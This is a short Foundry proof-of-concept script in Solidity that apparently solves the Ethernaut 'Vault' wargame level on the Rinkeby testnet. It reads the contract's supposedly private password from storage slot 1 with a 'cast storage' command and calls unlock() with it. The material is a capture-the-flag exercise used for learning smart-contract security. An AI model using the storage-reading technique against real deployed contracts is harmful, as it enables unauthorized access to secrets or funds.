// SPDX-License-Identifier
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "../src/level8.sol";

contract POC is Script {
    Vault level8 = Vault(0x36B39d1b3C6746a950c6aE40480C52822d6D6DBc);

    function run() external {
        vm.startBroadcast();

        // To get the password
        // cast storage 0x36B39d1b3C6746a950c6aE40480C52822d6D6DBc 1 --rpc-url $RINKEBY_RPC_URL
        // 0x412076657279207374726f6e67207365637265742070617373776f7264203a29

        level8.locked();
        level8.unlock(
            0x412076657279207374726f6e67207365637265742070617373776f7264203a29
        );
        level8.locked();

        vm.stopBroadcast();
    }
}
